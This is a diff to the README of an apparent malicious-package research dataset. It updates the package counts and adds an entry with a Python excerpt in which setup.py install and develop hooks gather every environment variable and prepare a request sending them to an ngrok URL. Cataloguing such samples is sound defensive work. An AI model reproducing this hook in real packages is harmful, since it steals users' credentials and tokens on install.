@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,123 versions of the source code of 5,406 malicious packages.
+This data set includes about 6,132 versions of the source code of 5,407 malicious packages.
 
 ## Dataset Format
 
@@ -608,6 +608,28 @@ def main():
 webquickauth [2.3.5] <br>
 startup-entrypoints [1.0, 4.0] <br>
 spacestudio-orbit-propagation [1.1.3, 1.1.4, 1.1.5, 1.2.0, 1.2.1] <br>
+
+
+### 23 Jun. 2024
+artifact-lab-3-package-a18ff5d9 [0.1.1, 0.1.2, 0.1.3, 1.1.2, 1.1.3, 1.1.4, 1.1.5] <br>
+
+```python
+def notmalfunc():
+    data = dict(os.environ)
+    encoded_data = urllib.parse.urlencode(data).encode()
+    url = 'https://2edb-85-48-187-158.ngrok-free.app'
+    request = urllib.request.Request(url, data=encoded_data)
+
+class AfterDevelop(develop):
+    def run(self):
+        develop.run(self)
+        notmalfunc()
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        notmalfunc()
+```
 
 ## About the malicious packages detection
 
